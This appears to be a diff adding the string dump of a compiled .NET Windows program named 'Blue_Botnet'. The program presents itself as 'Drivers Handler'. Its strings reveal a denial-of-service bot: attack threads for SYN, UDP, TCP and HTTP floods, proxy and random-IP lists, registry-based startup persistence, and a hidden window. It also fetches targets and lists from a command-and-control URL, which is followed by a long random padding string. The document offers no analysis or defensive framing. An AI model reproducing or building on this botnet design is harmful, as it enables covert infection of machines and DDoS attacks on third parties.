@@ -1,0 +1,427 @@
+!This program cannot be run in DOS mode.
+.text
+`.rsrc
+@.reloc
+p	o*
+	r1	
+PAsh
+*Vs;
+lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+BSJB
+v2.0.50727
+#Strings
+#GUID
+#Blob
+@	-	g
+<Module>
+file.exe
+DoSAttack
+Blue_Botnet
+Form1
+HTTPPacker
+HTTPRequest
+Program
+Resources
+Blue_Botnet.Properties
+Settings
+mscorlib
+System
+Object
+System.Windows.Forms
+Form
+System.Configuration
+ApplicationSettingsBase
+userAgents
+System.Collections.Generic
+List`1
+System.Threading
+Thread
+threadList
+HTTPData
+PressBody
+PressData
+ProxyData
+isAttacking
+method
+completeUrl
+threadsLoaded
+udpStuff
+threadId
+tcpStuff
+currentAttack
+startedThreads
+numberOfErrors
+first
+offline
+blogList
+proxyList
+online
+errorsLog
+port
+numberOfThreads
+print
+Random
+randomIp
+randomIpList
+readFile
+isUrl
+randomString
+randomString2
+System.Net.Sockets
+NetworkStream
+sendMCLogin
+sendMCMessage
+useless
+resolveUrl
+attackThread
+IAsyncResult
+onSynConnect
+attack
+prv_attack
+stop
+startThreads
+initThreads
+stopThreads
+removeThreads
+.ctor
+webRoot
+threads
+attacco
+loadStuff
+setOnStartup
+updateLists
+updateTarget
+toInt
+onlineFileContent
+fileFromWebRoot
+targetUpdater
+listsUpdater
+main
+EventArgs
+Form1_Load
+System.ComponentModel
+IContainer
+components
+Dispose
+InitializeComponent
+msgUrl
+msgHost
+lastMessage
+currentHost
+currentPort
+sendRequest
+makeRequest
+cleanUrl
+cleanPort
+GETPiece
+POSTPiece
+HostPiece
+UserAgentPiece
+AcceptPiece
+AcceptLangPiece
+AcceptEncodingPiece
+ConnectionPiece
+ContentTypePiece
+ContentLengthPiece
+RequestStr
+GETStr
+POSTStr
+HostStr
+UserAgentStr
+AcceptStr
+AcceptLangStr
+AcceptEncodingStr
+ContentTypeStr
+ContentLengthStr
+ConnectionStr
+POSTBody
+BuildGETRequest
+BuildPOSTRequest
+SetUrl
+SetHost
+SetUserAgent
+SetAccept
+SetAcceptLang
+SetAcceptEncoding
+SetConnection
+SetPOSTBody
+SetPOSTContentType
+Main
+System.Resources
+ResourceManager
+resourceMan
+System.Globalization
+CultureInfo
+resourceCulture
+get_ResourceManager
+get_Culture
+set_Culture
+Culture
+defaultInstance
+get_Default
+Default
+text
+rand
+path
+size
+minlen
+maxlen
+prdstream
+username
+ownIp
+message
+newIp
+newPort
+newMethod
+stringa
+link
+file
+sender
+disposing
+request
+nHost
+nPort
+host
+userAgent
+accept
+acceptLang
+acceptEncoding
+connection
+body
+contentType
+value
+System.Reflection
+AssemblyTitleAttribute
+AssemblyDescriptionAttribute
+AssemblyConfigurationAttribute
+AssemblyCompanyAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyTrademarkAttribute
+AssemblyCultureAttribute
+System.Runtime.InteropServices
+ComVisibleAttribute
+GuidAttribute
+AssemblyVersionAttribute
+AssemblyFileVersionAttribute
+System.Diagnostics
+DebuggableAttribute
+DebuggingModes
+System.Runtime.CompilerServices
+CompilationRelaxationsAttribute
+RuntimeCompatibilityAttribute
+DateTime
+get_Now
+ToString
+String
+Concat
+Next
+Int32
+System.IO
+StreamReader
+Char
+TextReader
+ReadLine
+Close
+get_Chars
+get_Length
+Convert
+ToChar
+Stream
+WriteByte
+ToByte
+System.Text
+Encoding
+get_ASCII
+GetBytes
+Write
+Contains
+Split
+Replace
+StringSplitOptions
+TcpClient
+Connect
+GetStream
+Sleep
+op_Equality
+get_Host
+System.Net
+IPHostEntry
+GetHostEntry
+IPAddress
+get_AddressList
+<PrivateImplementationDetails>{1CAAA3D7-B1B1-4D6E-84E9-00825419D2B3}
+CompilerGeneratedAttribute
+Dictionary`2
+$$method0x600000c-1
+TryGetValue
+WebClient
+WebHeaderCollection
+get_Headers
+System.Collections.Specialized
+NameValueCollection
+set_Item
+OpenRead
+IPEndPoint
+Parse
+Socket
+AddressFamily
+SocketType
+ProtocolType
+AsyncCallback
+EndPoint
+BeginConnect
+UdpClient
+Send
+ToInt32
+<>c__DisplayClass2
+<>4__this
+<attack>b__0
+ThreadStart
+Start
+Collect
+WaitForPendingFinalizers
+Exception
+get_Item
+set_IsBackground
+Abort
+Clear
+Application
+get_ExecutablePath
+ReadToEnd
+IndexOf
+Substring
+Microsoft.Win32
+Registry
+RegistryKey
+CurrentUser
+OpenSubKey
+Assembly
+GetExecutingAssembly
+get_Location
+File
+Copy
+Environment
+SpecialFolder
+GetFolderPath
+Path
+Combine
+SetValue
+op_Inequality
+IDisposable
+Control
+SuspendLayout
+System.Drawing
+SizeF
+ContainerControl
+set_AutoScaleDimensions
+AutoScaleMode
+set_AutoScaleMode
+Size
+set_ClientSize
+FormBorderStyle
+set_FormBorderStyle
+set_MaximizeBox
+set_MaximumSize
+set_MinimizeBox
+set_Name
+set_Opacity
+set_ShowIcon
+set_ShowInTaskbar
+set_Text
+EventHandler
+add_Load
+ResumeLayout
+STAThreadAttribute
+EnableVisualStyles
+SetCompatibleTextRenderingDefault
+System.CodeDom.Compiler
+GeneratedCodeAttribute
+DebuggerNonUserCodeAttribute
+ReferenceEquals
+Type
+RuntimeTypeHandle
+GetTypeFromHandle
+get_Assembly
+EditorBrowsableAttribute
+EditorBrowsableState
+.cctor
+SettingsBase
+Synchronized
+Blue_Botnet.Form1.resources
+Blue_Botnet.Properties.Resources.resources
+3System.Resources.Tools.StronglyTypedResourceBuilder
+4.0.0.0
+KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator
+12.0.0.0
+Drivers Handler
+Copyright 
+  2014
+$0e4fc97a-9ce4-4535-a4e4-0e59c6cfdc8a
+1.0.0.0
+WrapNonExceptionThrows
+RSDSU T
+pU,C
+c:\Users\huggye\Documents\Visual Studio 2013\Projects\Blue Botnet\Blue Botnet\obj\Debug\file.pdb
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="utf-8"?>
+<asmv1:assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <!-- Opzioni manifesto Controllo account utente
+            Se si desidera modificare il livello di Controllo account utente di Windows, sostituire il 
+            nodo requestedExecutionLevel con uno dei seguenti.
+        <requestedExecutionLevel  level="asInvoker" uiAccess="false" />
+        <requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />
+        <requestedExecutionLevel  level="highestAvailable" uiAccess="false" />
+            Specificando il nodo requestedExecutionLevel verr
+ disabilitata la virtualizzazione dei file e del registro di sistema.
+            Se si desidera utilizzare la virtualizzazione dei file e del registro di sistema per la compatibilit
+ con le versioni precedenti, 
+            eliminare il nodo requestedExecutionLevel.
+        -->
+        <requestedExecutionLevel level="asInvoker" uiAccess="false" />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
+    <application>
+      <!-- Elenco di tutte le versioni di Windows con cui 
+ possibile utilizzare l'applicazione. 
+     L'ambiente maggiormente compatibile verr
+ scelto automaticamente.-->
+      <!-- Se l'applicazione 
+ progettata per l'uso con Windows Vista, rimuovere il commento dal seguente nodo supportedOS-->
+      <!--<supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}"></supportedOS>-->
+      <!-- Se l'applicazione 
+ progettata per funzionare con Windows 7, rimuovere il seguente nodo supportedOS-->
+      <!--<supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/>-->
+      <!-- Se l'applicazione 
+ progettata per l'uso con Windows 8, rimuovere il commento dal seguente nodo supportedOS-->
+      <!--<supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"></supportedOS>-->
+      <!-- Se l'applicazione 
+ progettata per l'uso con Windows 8.1, rimuovere il commento dal seguente nodo supportedOS-->
+      <!--<supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>-->
+    </application>
+  </compatibility>
+  <!-- Abilita i temi per finestre di dialogo e controlli comuni di Windows (Windows XP e versioni successive) -->
+  <!-- <dependency>
+    <dependentAssembly>
+      <assemblyIdentity
+          type="win32"
+          name="Microsoft.Windows.Common-Controls"
+          version="6.0.0.0"
+          processorArchitecture="*"
+          publicKeyToken="6595b64144ccf1df"
+          language="*"
+        />
+    </dependentAssembly>
+  </dependency>-->
+</asmv1:assembly>
+--START-http://volamthailan.com/bot300/*300-END-LnYacvIHEvcoPdftoJIBRdDMPKmaxiM02mM3DPl878DDwbX0SdsIUgZskMKRIsTgimvnQmpYhJDTZ9ZyxvHUzDfWMeS1EUzPogeKptkqxUlKdGSkwWeWk9rfGZavTyUNUxp3fPIDLagfcV3FMrFs0cpoz9EQTyX99X0pbYFhNaLJdMDufViltlX1IADgK2uWDgfEfOoxmheZRfLm5Tu7PvQYA8gaUjWVpyF6r8PRqv9LG7knzbk1IwHSPGEgrNcCLJtcZO57EcQevFRCY3l39fN3rxqk4skdS796NHNlfmxpfmhKyBIxmiCq60vmhVDV1xMyGUyQq9YWrhXEPgv2jx0t4SAXWkEKjbxsatEdM1GnKq8YdqWAjKvE6c3xUb4F5OwQupogcRqsrNjOUm3pODkZptv7zRJu7Br53soxC0iReDXt3ocsiP11nXkA4qqLI5upfnUm7FmXfT5mWCEKybMrJzSgHo3VJXJiSrNQU0ucmdWUb8n2lfXqsCgqUyeTMQOHJWTpyy07quFpd7EJABunAczQKh5fWbQVPOKFp8DxoZ9870MXtVTKgkHrgDfR3VkPetaOx9eC868kc1STUhvAHFyoHdilcv4TzteNa8ju1QMkmhOpuL7VjjIY5vHUb2jMCousWF2V7BJ02OCjO21RyitPlGSo1PT9rAh7wgTpSlXiaRfqthFiBRXd5fGQwNessKJ2qFwsiL8MLLyUkl5TJu7ZmDCRZD2EHp0QHm9nuXAzTLStrvpLSKi8MtQmDfSfT4FfVhN7lRjvtIGbvSjnXrw6G2EXWXkOFfgYFwYJirjAlwODnz1u5oHlHIZcdzlOrUqOlrV83aFqHwVUoAugf0SaX4Q6X5psGUTQG9c5d20fjbdVwFycFEs1BQ1qaYk8uWjwdFOoiyDm9x16b5KSHMnCmcPzIvfFS2uM1q2r1J4QBF1NZ4PfOS0itgKB0YgwT8UGDoEuCcb8SWBgkBaNf90ABMdVg11cmH7DuuKuzfdw02QWfnay7SRTHUE1KtOKl8VKZ8vz1qYAgDJJ5Hz2bCfT0n5apTjFRSL2hF7h2k7Q4RxDL55D3VticBUvDVKiGSsN2Qm0JSA0FOZjz1OuXgL5jmZfvLdgaZKlijL4TF3lV2cNlu6MGZKkGxoP1GE8ydZpExAQqUaSmkkqJL4APRaAPkfv45DNB5w2dxJyupfw827fN8GpMDthDYadSPVuRNRrysMWBFQjvnCXn9i6zXB7LPyEWqffUuevkQrevtoGwJvZWD0SqY54MTfj3IAVjvOAIQwWSDKFt4LCeYrS0Ny5ykiRvIlntTgB4uQGRdAnO0LRIdFeareW7TLirelKcgWZYJHuIlBWNLr8ZRJSDGNByJElisYx2zLrdv38VVWyqIJwmNIaVTHVTUlOFfLZNOeX99eoYK6suYVqAS9Uk7cjszXJJo20J7kcovwmsdCKXZl495Nxg1zPv4oJlVftRGiwy3COfWmG5RMTOdJNaFTSHUqtHmAX8S2R0yGG38RJOsUesU5ILRSMwQpdMSH3VPImZ5daWDUbyJDZALAwr1LrAqejJn3k1Yx9krFx0ewI70YmNPcASULeDbmsa4RsJtkZVDySGM5MFCtJS1V3K2ShMT5JEWW6ND8NQ8RKbJ4FY8ZBrdaiiXhQbDNBHpOuz99BDg2UkLcB8MIN44cl6yXzfswNuPCw5JPZ9X7KkG8W5gSP4AHNMmxBlKfVupjVJqFy6tOh6RA00B49ZhTuHzjTWOxz2ma5gmNPbdSKwkQ5l7LkPg5NVzNUGwcs5YoU1ETNxoi6OI8hiorYCNjWqNjrY3IoAkPX56Dgn7xk788N0pvcFDpszSnnfmy3g35o3lmlkKuFa8YrOV0sHpj65ghmTaBBI3EEDUUPDK24SkR135ZJvFw0U8sWD9RKIt6h4Uo4Blp7xooVOqsYB2QDGNtEl8ME2rwjnu6jQeIKazCpUXHWQ3JQd3aqkkSCZlEG2EretJIguGmRKDtN1zx9ifGuUQ8pMFuzv6xQqnmHumfWQJfg1ELjxEhW76KdKdTpVxgOQchOMqP69teKvbxI4LBqZbSucJ6RT0BdnRQYh6WHzlWNb9rspLvKvzyyJwvDt7mIsAheLZl7y41yFESdbNmIF1sxcbOuLTX18NfbbNhQkxV17AtEeRlgVeC0SuCtK1veh9z2j1COqWhSf1zbsKP4s1gdKoIqLxGtC0U8K1fnOWz86uUb4kBAl1wpcWr4sVD2QyPph1R1ompVBigZUqwlwGHKEofyJk42T7sHfp4DSKV8Lao4zSkCjcGKrEk2VcrDswCEzY4owtSmuI9oAk90A2T11iaaFBr0cRQZXjFaY6P0JdZiF52vd0D0dLNR8diuCcKc2jRaficEmdrXI2UKI6WlOa5MWyb5XfyrT7qfocP5Y8NAdzIGIYlFGiNboEDrGhqGo9ELLzfqqaNPM5sgqVw83slutO1jYiy1RHVev64T25ZpV8PsWhBvusN6XUc776RImV7FjOvtbdG8S6Yv8JN1gDGj4YGbd7V6nQCAAKIHwRURlOnb5r8ysaljOYLKHTQdHJUC4YuyAFFPsz7pvpfv8hONpdvl98AcB0Jc3lgg6KymVW0ZafZcyefk5HWbnIzBFmO2qfvJI9yytm2TmWLdiiogUjhwOF3xUwgsH7s5tQTypr0TPDyR7Vdh8rhG794CFAd6FKLonQtROz1nsOhLRl09S9taZm7tWQtoN4NE1JoqlLSJ04YtcsvdKeoGavOBT958GMZyAcTH7JXGqkjfNNRnfPetQHnG4nXmQUDoeksAZngAHhZ0LtxFsSd0sqh3yMNUvv0Wg5BnfRN1tdmtsx4LzS370M5yCzLMaLPWqCTQrKjbEmHPDyKASBfc12gU9NkpFBahNQCpdnepsc3OEquNoK3Zqwexg9Rej3VDLkBwwfhohzuZ9RPScXB4HB0bwOJeWAFyG0Dep8bJnP20CFyPu8BM2b5JtjAhVCRhu5SJNune61R2J9ZqZ3uY836o43uG73xk7VGGwpB9VhQAKDAuJUIbS3i09nOUAghCEq4y3S3u2vCbn5e13A6nvVSDwPHIbq8yAN6dIM10aXjh1GNDJWbAk3RsY1BnLvSLwOba8AtrIFMXwuMpCD9FP8OG5NFQKOppEXvmpwEImu1fq46npWkHvN6xAVev5cg4ZhSY8jAP81cfHtZBQblxnh30b8mURTMJN6FJlioFWUI4vapR6ded1sR2ob7A6p7poSSKnQZswgbSY8FASVYyysSepNeJkoIqXdQcIfnpDvrVR8dqW6skRJ05AxeavQHIXv55sm2wssuDB7Nrtywo5iZNnUcUAM3xni8gDi7tE52iYw3Dkxq7ddNzVrRXKhwgy7Zc8qoL0Dk9p0z0bYtNf6TKVJKVQkjgJWubXaE3JfHa3NJf2a6vyiA2nOHzgS5PeDzTGXdAUzEAz3RH9odzoxskV1xITOX0k15zXzZe75b8e9Du79z2yFlqVP7OjUrFcNa87btKP92sWuFWyDLTZeCePPeI2L4nOVfRiEwgPpnzN2UkJlZgJXq7K5ss7lSEEOeAOyxtQoEt1MRX439QvYe1phGmWEioXjv8YUWUxpPeT6G8nVxDlBSpunUqrKXLFZWSbT8khodFJ9hsbI9BRfDWQGOv9pnmSDY3kxhUWMg6hMguFmOiLW4kW9BUFNl1B0xFlnHnlooE8GyDkdqWbEb6JxhkwMPJlp5rZaJbel7hrzlQL7ulhOZ6Z16xGg1YZfdTKHoJUO1zH4OTLRZybnlWP9RheVU8tiHMWSFETlRSWjzfnmlzHD7w3GDKzGo933GiwB63LUfzWT9pKv41uf1qkVTQP4OM6RYddQtmpsnwiHZkGXAEMwPYCa7arqnQGS2E4gM4CRMB2EId5tJ14K9KCAaDSS49EXpPPVpjLGC4kNf7Sef7gwV6TsB3FIluWM7fZ2OkDjqyHEjzedvyx7cSBt5gTweCfShXPAiZQ446GhyOJLZmXw6Zupdp7rRRFnTzgLjd4Wh3CfLd4qXHX2osVInkg2bimm1cN8s7m5rBPDWOdAvQUJ4N8leYi96C49QaotP58ZfbKndRvYHgHLOdsndmeTYm8oGQx6ktuzS4ncCVIMnJ2a5tuxrBPnboA2dfgNeyyXwR2TzPkIeRqOuhtXfAOidHYn3v8gy4rzVfon0a7baHIJ8vI5wJrejP3p2OaERDUjk13P3GgECwIW8PpHmDuoNNPGl8ulA3KWxjjH23BpmncwGgqnjSbOSpWWlxn4V4DImvjZqhPtBFCjud9ESHCsc6EHMMgFPGUsjUKV7R7BDsMNnwlHximO2VqprbMdBJd4uTAaTnHAKAott1eakYRqeGzOneofEdA3OScTvLyKblD1q65z7v3n2waodwwy9l5rAvebYKoZjHP2C7hriyiTjWBb2xz9YAL0pW15cebwGeDvhimgPFPKCmHntCjkVpAj5YMpGmOEXwMFTQ4ULTuTuAxDPOLZ50abedzIV6am0LxPaBTdIPZC5rz5lJa1azIgVulzbv8O3HcjNhmN4sRqbYgxo3hLgiMBCQ4padBWQKIxOQsDhM6sicF6OyLhOwsU5bg6n6xaq4ZQQsiYLeoUlddjL7bmSeIdcx2wtvZkZgBnDyqgPwVtHYtb87upfLIMv5yczvpZEE4FbzgWQ4WfIYWEEayvBuEOXz1HAOqeH6pDdn9IbYYkymDXjtXZ63YU9qrm7YVCO2XMsSkbaqUnVeZvweiQ0RhOhVDx5XKCCWW6O1oQJ68Qiv8fR6zd0EL7VJoXOxfDfSk8Hcg40RH4SQqwXif9hrM7KZlFNRBVa5vQK9Xya5ni7RoEd19qRgfxFnys1briPwdXeZmXKrimDn93vglVRVD4Z7KgLp78NETKxQkDPmgk73ubn57UzVR4sj8gOFLeukY9UzFe6iGoyd6gNt2QsmI1xYcOSDyJbB0XevGyzcYRPmFPmbSfN5wHbgL6W1M2t6NxnjBcmDbPO1lLSMl0uT6fOt57jKb7QfiTYRmCZ02Jeh2j4AnKPVHZArj3nD2cmd8sTSwBkjb4axBq0WDjhRs4YITqssZV7ahAiJQmNmjq4M8Mq2DRAT4UvDUK8FS2JF7APBIqFbW4sBALJGAzoHVnfNPezFnHTqgzP87puWMj7AltDIB2FcNCuTeCvn19xOlBfL6KJVFS5vqflgbqEvC1ddF5e43HfMvtYkN2L0ttW5H8n8bPLK4CLtiBGBqOb8ws97GBSjfOBSehWGSfdo5VRthoCMvKJeSYIY8p1a7mpqA2PAo9tKuxDbbQZc8FxUFhAFY8HmoDrSqlsoZBhwb9ueVr7sPZb1zUld1Jlq1GgrGuvzivC7hA3FxfurAZWOmzdVAOwPa14UdDYk6HJeWdTyafqWZ4pbuREQQZzT8xhqGjmuHKv3Q12Ifp4eiazfLdjM8ITgR0gi6ns126OPIwL2Y6uleVvh7Bem9av90OlZVTM27DllMkXZRqxCXsB6F9k5JF1cKPZ3KvhEt2obtJVXoFVSntlHNoUVsQs2MJa6LdOfJsSfEkN5oNQEtiybnRqfaLVdJvPjsYLL0zJ4aGDnbZrf9oInV9S4wsE7WzVSUoMPCFN4Y3AhODEBd0dfnlOtFRYHuLiluuSwMbd4aOOb8vqtoDefV0otacKvqGJNVZwduRzBXjEZWwvUkpdrrCP4FjWtRsNUEBFj8N8WNcIwvPWnrzKBmbfTJ2XL5FupWuUVrMWXqHdP4dI0MsCbhLsmfwZFzxbIscaB4B6edwVf8QYptg8MD
